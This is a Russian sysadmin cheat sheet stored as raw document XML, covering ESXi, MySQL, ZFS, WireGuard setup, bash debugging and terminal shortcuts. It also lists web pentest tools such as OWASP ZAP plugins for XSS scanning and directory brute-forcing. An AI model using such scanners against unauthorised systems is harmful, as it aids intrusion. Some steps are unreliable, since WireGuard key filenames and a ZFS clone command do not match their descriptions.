      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcfg-vswitch -l - информация о виртуальных коммутаторах</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">find . -name libstorelib.so - </text:span><text:span text:style-name="T1">найти</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> libstorelib.so</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dcui - работа с консолью сервера через ssh сессию</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">chkconfig -l - статус работы демонов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli hardware memory get - размер установленной памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli software vib list - список установленных vib-пакетов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli network ip connection list - состояние активных соединений (аналог netstat)</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">esxcli storage vmfs extent list - информация о примонтированных/подключенных томах VMFS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli hardware clock (get/set) - отображение/установка времени esxi-хоста</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd - Смена текущей директории;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cp - Копирование файла.cp [файл 1] [файл2];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">find - Поиск файлов по критериям;</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">ls - Список файлов и директорий в текущей или явно указанной директории.ls /vmfs/volumes/ ключи: -l подробная информация -a отображение скрытых файлов;</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">mkdir - Создание директории;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mv - Перемещение файла. Переименование файла.mv [путь и имя файла] [путь, куда перемещать];</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ps - Информация о запущенных процессах. ps -ef;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">rm - Удаление файлов;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">shutdown - Выключение или перезагрузка сервера shutdown nowshutdown –r now;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">vi - Текстовый редактор;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">nano - Дружелюбный к новичкам текстовый редактор, отсутствует на ESXi;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cat - Вывод содержимого файла на экран. cat /etc/hosts;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">more - Вывод содержимого файла на экран, по странице за раз. more /etc/hosts;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">man - Справка по командам man &lt;команда, по которой есть вопрос&gt;, для некоторых команд помощь выводится при запуске самой команды без параметров;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">useradd - Создание пользователя. useradd &lt;имя пользователя&gt;;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">passwd - Задание пароля пользователю passwd &lt;имя пользователя&gt;;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli storage nfs list - список подключеных nfs- хранлилищ на хосте</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli software vib list - cписок установленных vib-пакетов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">esxcli hardware memory get - информация об использовании памяти на хосте ESXi, включая общий объем</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Инструмент перечисления коротких имен файлов IIS:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Расширение Burp Suite запускайте действия и изменяйте форму HTTP-запроса/ответа и трафика WebSocket с помощью настраиваемых правил. https://github.com/synfron/ReshaperForBurp</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T1">https://github.com/nvbn/thefuck - утилита, которая исправляет ошибки в предыдущих консольных командах. Примеры:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">➜ apt-get install vim</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">➜ fuck</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo apt-get install vim [enter/↑/↓/ctrl+c]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[sudo] password for nvbn:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Reading package lists... Done</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">…</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">➜ git push</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fatal: The current branch master has no upstream branch.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">To push the current branch and set the remote as upstream, use</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">git push --set-upstream origin master</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">➜ fuck</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">git push --set-upstream origin master [enter/↑/↓/ctrl+c]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Counting objects: 9, done.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">...</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">На Ubuntu / Mint установите The Fuck с помощью следующих команд:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo apt update</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo apt install python3-dev python3-pip python3-setuptools</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">pip3 install thefuck --user</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">На FreeBSD установите The Fuck с помощью следующих команд:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">pkg install thefuck</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">На macOS или Linux установить The Fuck можно через Homebrew:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">brew install thefuck</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW DATABASES; - список баз данных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW TABLES [FROM db_name]; - список таблиц в базе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW COLUMNS FROM таблица [FROM db_name]; - список столбцов в таблице</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW CREATE TABLE table_name; - показать структуру таблицы в формате «CREATE TABLE»</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">DESC table_name; - узнать полную структуру таблицы</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">SHOW INDEX FROM tbl_name; - список индексов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW GRANTS FOR user [FROM db_name]; - привилегии для пользователя.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW VARIABLES; - значения системных переменных</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW [FULL] PROCESSLIST; - статистика по mysqld процессам</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW STATUS; - общая статистика</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SHOW TABLE STATUS [FROM db_name]; - статистика по всем таблицам в базе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">USE db_name; - использовать базу данных, для которой будут выполнятся дальнейшие запросы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">DELETE FROM table_name; - удалить все записи из таблицы. Сначала нужно выполнить USE db_name;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SELECT * FROM table_name; - просмотр всех записей из таблицы</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шпаргалка по ZFS:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">modinfo zfs | head -n 9 - узнать версию ZFS и другие подробности</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о пулах / файловых системах (ФС) на пулах:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool list - статус пулов</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">zpool status -v - статус пулов подробный</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">zfs list - список ФС, так называются монтируемые разделы в пулах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs get all - вся инфа по пулам, вообще вся</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Управление пулами / дисками:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool create zfspool disk-id-1 disk-id-2 - может быть сколько угодно дисков, с ключом -f форсить создание пула</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool create -m /mnt/backups zfspool disk-id-1 - создать пул с указанием папки маунтирования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool destroy zfspool - уничтожить пул zfspool, с ключом -f форсить уничтожение</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkfile 100m disk1 disk2 - создать файлы дисков</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool create backups /disk1 /disk2- создать пул backups на созданных файлах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool create zfspool mirror /disk1 /disk2 - создать пул zfspool с зеркалированием на 2 диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool add zfspool /disk3 - добавить диск в пул</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool attach zfspool /disk3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool remove zfspool mirror-1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool detach zfspool /disk3 - исключить устройство из пула</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool remove zfspool /disk3 - удаление устройства из пула</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool add zfspool spare /disk3 - добавление диска горячей замены в пул</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool remove zfspool spare /disk3 - удаление диска горячей замены из пула</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T1">zpool online zfspool /disk1 - включить disk1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool replace zfspool /disk1 /disk3 - заменить disk 1, например в случае неисправности на disk3</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zpool upgrade -v - увидеть версию, и фичи текущего ZFS, -a обновит все пулы до новейшей версии</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создание ФС и свойства ФС:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs create zfspool/data - создать ФС data</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs create zfspool/backups создать ФС backups, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs destroy -fr zfspool/backups/old - уничтожит ФС old, ключ -r - рекурсивно, если внутри ещё несколько ФС, -f - форсить</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs set reservation=1G zfspool/data - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs list -o quota zfspool/backups - выяснить квоту в пуле на ФС backups</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs set quota=1G zfspool/backups - установить квоту в 1 Гигабайт на ФС backups</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs list -o compression - проверить включена компрессия или нет</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Маунт:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs mount - отобразить все маунтированные ФС</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs mount zfspool/backups - маунт ФС backups</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs umount zfspool/backups - анмаунт ФС backups</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs mount -a - маунт всех ФС ZFS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs umount -a Umount - анмаунт всех ФС ZFS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Снапшоты:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs list -t snapshot - отобразить все снапшоты</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs list -o space - сколько занимают места снапшоты и конкретные дети пулов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs snapshot zfspool/backups@test - создать снапшот ФС backups с названием test</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs rollback zfspool/backups@test - вернуться к снапшоту backups с названием test, с ключом -r рекурсивно уничтожит промежуточные снапшоты, с ключом -f форсит анмаунт и ремаунт</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs destroy zfspool/backups@test - уничтожить снапшот backups с названием test</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs send zfspool/backups@march2021 &gt; /home/backups/march2021.bak - сделать локальный бекап снапшота march2021</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">zfs receive zfspool2/backups2 &lt; /home/backups/march2021.bak - Восстановить из локального снапшота ФС на другом пуле</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs send zfspool/backups@march2021 | zfs receive zfspool2/backups2 - Комбо предыдущих двух</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs send zfspool/backups@march2021 | ssh COMP02 “zfs receive testpool/testfs” - Отправить снапшот по SSH на хост COMP02</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">zfs clone zfspool/backups@march2021 /clones/backups - Клонировать существующий снапшот</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">zfs destroy zfspool/backups@march2021 - Уничтожить клон</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Векторные базы данных (часть 1): что отличает каждую из них? https://thedataquarry.com/posts/vector-db-1/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Векторные базы данных (часть 2): понимание их внутреннего устройства https://thedataquarry.com/posts/vector-db-2/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Векторные базы данных (часть 3): не все индексы одинаковы https://thedataquarry.com/posts/vector-db-3/</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Векторные базы данных (часть 4): анализ компромиссов https://thedataquarry.com/posts/vector-db-4/</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезные сетевые утилиты linux:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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2"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как отлаживать bash-script-ы по шагам. Волшебная строчка, которую нужно добавить после #!/bin/bash, чтоб скрипт можно было отлаживать по шагам</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line3</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1"># <text:s text:c="28"/>Online Bash Shell.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># Write your code in this editor and press "Run" button to execute it.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line2</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">echo line3</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">echo "Hello World";</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ТОП-10 <text:s/>плагинов для OWASP ZAP:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">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text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">DOM XSS Active Scan Rule: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/)Активный (https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/) сканер для обнаружения уязвимостей DOM XSS.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Directory List v2.3: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/)Предоставляет (https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/) файлы с именами каталогов для брутфорса или фаззинга.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">GraphQL Support: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/graphql-support/)Плагин (https://www.zaproxy.org/docs/desktop/addons/graphql-support/) для получения структуры и запросов GraphQL.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">HUNT v2: <text:s/>(https://github.com/bugcrowd/HUNT/tree/master/Remix)Выполняет (https://github.com/bugcrowd/HUNT/tree/master/Remix) пассивное сканирование на наличие потенциально уязвимых параметров.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Community-scripts: (https://github.com/zaproxy/community-scripts) Большая (https://github.com/zaproxy/community-scripts) коллекция скриптов ZAP предоставленная комьюнити</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Как настроить VPN-сервер WireGuard на CentOS: Шаг 1. Установка сервера WireGuard на CentOS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo yum update </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo dnf update</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте репозитории EPEL и Elrepo для установки модулей ядра и инструментов WireGuard.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo dnf install epel-release elrepo-release -y</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Убедимся, что у нас включены репозиторий PowerTools, так как пакеты EPEL могут зависеть от пакетов из него:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo yum install 'dnf-command(config-manager)'</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo yum config-manager --set-enabled PowerTools</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Прежде чем мы сможем установить модуль ядра WireGuard, включим его официальный репозиторий:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo yum copr enable jdoss/wireguard</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Теперь установим WireGuard:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo yum install wireguard-dkms wireguard-tools</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шаг 2. Генерация закрытого и открытого ключей. Перейдите в каталог:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">cd /etc/wireguard</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установите разрешение на эту директорию:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">umask 077</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы сгенерировать пару ключей:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">wg genkey | tee private.key | wg pubkey &gt; public.key</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы просмотреть сгенерированные ключи:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ls -l privatekey publickey</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo cat privatekey</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Обязательно запишите этот ключ, он понадобиться нам далее:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo cat publickey</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шаг 3. Настройка серверной конфигурации. Чтобы начать настройку сервера WireGuard, перейдите в папку /etc/wireguard и создайте файл wg0.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo nano /etc/wireguard/wg0.conf</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавьте в файл конфигурации следующие директивы и заполните данные созданными до этого ключами:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[Interface]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PrivateKey = &lt;contents-of-server-privatekey&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Address = 10.0.0.1/24</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ListenPort = 51820</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[Peer]</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PublicKey = &lt;contents-of-client-publickey&gt;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">AllowedIPs = 10.0.0.2/32</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Скопируйте закрытый ключ, который мы сгенерировали ранее, и вставьте его в PrivateKey.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo cat /etc/wireguard/public.key</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo cat /etc/wireguard/private.key</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шаг 4. Настройка FireWall:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo firewall-cmd --add-interface=wg0 --zone=internal</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sudo firewall-cmd --permanent --zone=internal --add-masquerade</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шаг 5. Запуск WireGuard и включение его при загрузке:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">wg-quick up wg0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Горячие клавиши для работы в терминале Linux. Перемещение по строке:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">← , → или Ctrl + b, Ctrl + f Смещение курсора на один символ левее или правее.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + →, Ctrl + ←</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">или</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + b, Alt + f Смещение курсора на одно слово влево или вправо</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + a, Home Установить курсор в начало строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + e, End Установить курсор в конец строки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + xx Переход между двумя последними позициями курсора</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сочетания клавиш для редактирования строки в терминале. Редактирование строки:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Tab, Ctr + i Автодополнение команды или пути</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Tab, tab или Alt + ?(Shift+/) Представление вариантов автодополнения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Backspace, Ctrl + h Удаление символа перед курсором</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + d Удалить символ за курсором</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + w или Alt + Backspace Удалить все символы от курсора до пробела слева</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + d, Esc + d Удалить символы от курсора до конца слова</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + y Вставить слова, которые были удалены с помощью Alt+d, Ctrl+w</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + \ Удалить любое количество пробелов вместе, где стоит курсор.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + r, Esc + r Отменить все изменения внесенные в строку</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + c Изменить регистр буквы под курсором на заглавный и переместить курсор в конец слова</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + u Изменить регистр всех букв от курсора до конца слова на верхний регистр</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + l Изменить регистр всех букв от курсора до конца слова на нижний регистр</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + t Поменять местами слово под курсором и предыдущее слово</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctr + t Переместить символ перед курсором под курсор</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + _(Sift+-) Откат редактирования (Undo)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сочетания клавиш для просмотра истории команд. История команд:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ctrl + r Поиск ранее введенной команды в истории</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">↑, ↓ или Ctrl + p, Ctrl + n Перемещение по истории ранее введенных команд и путей</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Ctrl + o Вызвать последнею введенную команду</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Alt + . или Esc + . Вставить аргумент команды, выполненной ранее</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">Alt + &lt; (Shift+,) Повторить первую команду в буфере истории</text:span></text:p>
